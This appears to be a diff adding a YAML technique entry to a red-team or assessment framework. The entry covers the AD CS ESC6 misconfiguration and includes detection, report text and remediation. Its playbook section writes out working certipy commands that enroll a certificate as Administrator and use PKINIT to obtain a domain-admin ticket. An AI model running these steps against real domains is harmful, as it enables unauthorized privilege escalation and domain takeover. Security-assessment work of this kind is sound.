@@ -1,0 +1,64 @@
+# ESC6 — ADCS CA has EDITF_ATTRIBUTESUBJECTALTNAME2 → any template lets SAN
+#
+# The Enterprise CA's config flag EDITF_ATTRIBUTESUBJECTALTNAME2
+# is set. This flag globally allows any enrollee to specify a
+# Subject Alternative Name in the enrollment request — even on
+# templates that don't have ENROLLEE_SUPPLIES_SUBJECT set. Any
+# template with client-auth EKU + broad enrollment becomes an
+# ESC1-equivalent; the attacker enrolls with UPN=Administrator
+# and PKINITs to a DA TGT.
+#
+# Detection: `certipy find -vulnerable` flags "ESC6".
+# Fix: remove the EDITF_ATTRIBUTESUBJECTALTNAME2 flag from the
+# CA config (`certutil -setreg policy\EditFlags ...`); revoke
+# certs enrolled with unexpected SANs since the flag was set.
+technique: T1649
+name: ESC6 — ADCS CA EDITF_ATTRIBUTESUBJECTALTNAME2 → any template = ESC1
+tactic: [privilege-escalation, credential-access]
+platform: [windows]
+key: 'adcs:esc6'
+family: adcs
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: quiet
+detect:
+  version_range:
+    services.adcs: ">=1.0"
+execute:
+  command: |-
+    certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc> 2>&1 | grep -A 5 ESC6 || echo "no ADCS CA flagged ESC6 — see playbook"
+verify:
+  success: "ESC6"
+cleanup:
+  command: ""
+report:
+  vector_type: cert_template_esc6
+  evidence: "CA {{ca}} has EDITF_ATTRIBUTESUBJECTALTNAME2"
+  description: >
+    The Enterprise CA's global EditFlags include
+    EDITF_ATTRIBUTESUBJECTALTNAME2 (value 0x40000) — every
+    template on the CA now accepts operator-supplied SANs,
+    including UPN. Any low-priv user enrolling any
+    client-auth template can claim UPN=Administrator + PKINIT
+    to a DA TGT. Fatal misconfig; treats every template as
+    ESC1.
+  remediation: >
+    Remove the EditFlags entry on the CA:
+    `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`
+    then `net stop certsvc && net start certsvc`. Audit the
+    issued-cert log for entries with a UPN SAN that doesn't
+    match the enrollee's real UPN since the flag was set.
+    Revoke every such cert.
+  refs: [T1649, ESC6, certipy]
+playbook:
+  summary: >
+    CA-wide SAN acceptance → any client-auth template = ESC1 →
+    enroll as Admin → PKINIT → DA.
+  place: 'attacker-side (certipy)'
+  steps:
+    - "confirm: `certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc>` — look for ESC6 on the CA"
+    - "enroll as Administrator with any client-auth template: `certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA>' -template 'User' -upn 'Administrator@corp.local'` — writes administrator.pfx"
+    - "PKINIT: `certipy auth -pfx administrator.pfx -dc-ip <dc>` — DA TGT"
+    - "CLEANUP: revoke the enrolled cert via `certipy ca -revoke <serial>`"
+  restore: "certipy ca -revoke <serial> -u '<user>@<domain>' -p '<pass>' -ca '<CA>'"
